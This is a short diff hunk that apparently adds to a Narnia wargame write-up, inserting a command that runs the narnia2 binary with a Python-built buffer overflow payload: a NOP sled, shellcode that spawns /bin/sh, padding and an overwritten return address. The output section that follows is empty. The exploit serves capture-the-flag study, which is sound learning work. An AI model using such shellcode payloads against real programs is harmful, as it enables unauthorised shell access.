@@ -1326,8 +1326,15 @@ cd /narnia
 ls
 ./narnia2
 cat narnia2.c
+./narnia2 "$(python3 -c 'import sys; sys.stdout.buffer.write(
+    b"\x90" * 100 +  # NOP sled
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # Shellcode
+    b"\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b"
+    b"\xcd\x80\x31\xc0\x40\xcd\x80" +
+    b"A" * (132 - 100 - 28) +  # Padding
+    b"\x10\xd2\xff\xff"  # Return address near ESP (adjust if needed)
+)')"
 ```
-
 Output:
 ```bash
 
